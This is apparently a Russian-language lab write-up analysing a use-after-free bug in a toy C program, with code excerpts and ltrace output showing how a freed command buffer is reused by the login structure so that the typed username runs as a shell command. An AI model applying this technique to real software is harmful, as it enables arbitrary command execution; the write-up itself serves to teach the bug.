Программа управляет двумя объектами в куче: `cmd` и `cred`

Ключевые фрагменты кода:

```c
// main  после destroy_cmd cmd НЕ обнуляется
case 'd':
    destroy_cmd(cmd);   // free(cmd), но cmd в main остаётся ненулевым
    break;

// logout обнуляет *cred через указатель, всё норм
void logout(cred_p *cred) {
    destroy_obj(*cred);
    *cred = NULL;       // cmd не получает аналогичной зачистки
}
```

---

## Нормальный сценарий (i → c → e → d → o → q)

```bash
ltrace -e malloc+free ./login_exec
```

```bash
$ ltrace -e malloc+free ./login_exec
> i
login_exec->malloc(24) = 0x5eeb74e91ac0 # login(): struct cred (user[18]+passwd[6])
Type user name: user
Type passwd value: pass
Cred is '(user, pass)'
> c
login_exec->malloc(16) = 0x5eeb74e91ae0 # create_cmd(): cmd буфер CMD_MAX_LEN=16
Command 'ls -lha ./' was created
> e
Try to execute 'ls -lha ./'
total 44K
drwxrwxr-x 2 jim jim 4.0K Apr 17 03:17 .
drwxrwxr-x 3 jim jim 4.0K Apr 16 20:00 ..
-rwxrwxr-x 1 jim jim  17K Apr 17 03:17 login_exec
-rw-rw-r-- 1 jim jim 4.3K Apr 17 03:18 login_exec.c
-rw-rw-r-- 1 jim jim 4.7K Apr 16 20:07 README.md
--- SIGCHLD (Child exited) ---
The command 'ls -lha ./' was executed successfully
> d
login_exec->free(0x5eeb74e91ae0) = <void> # destroy_cmd(d): cmd освобождён
> o
login_exec->free(0x5eeb74e91ac0)   = <void> # logout(o): cred освобождён
> q
+++ exited (status 0) +++
```

Выделение: `cred` (смещение 32 = chunk overhead + 16).
Освобождение в обратном порядке - всё ок.

---

## Уязвимый сценарий (c → d → i → e → q)

```bash
ltrace -e malloc+free ./login_exec
```

```bash
$ ltrace -e malloc+free ./login_exec
> c
login_exec->malloc(16) = 0x563b63abfac0 # create_cmd(): cmd* A
Command 'ls -lha ./' was created
> d
login_exec->free(0x563b63abfac0) = <void> # destroy_cmd(d): cmd освобождён, но cmd в main НЕ NULL!
> i
login_exec->malloc(24) = 0x563b63abfac0 # login(): cred* A - ТОТ ЖЕ АДРЕС!
Type user name: user
Type passwd value: pass
Cred is '(user, pass)'
> e
Try to execute 'user'
sh: 1: user: not found
--- SIGCHLD (Child exited) ---
Error while calling the command 'user', status code: 32512
> q
+++ exited (status 0) +++
```

Use-After-Free (UAF) уязвимость
```bash
sh: 1: user: not found
Error while calling the command 'user', status code: 32512
```

Поскольку `malloc(16)` и последующий `malloc(24)` возвращают один и тот же адрес, при логине, можно передать произвольную команду для выполнения.

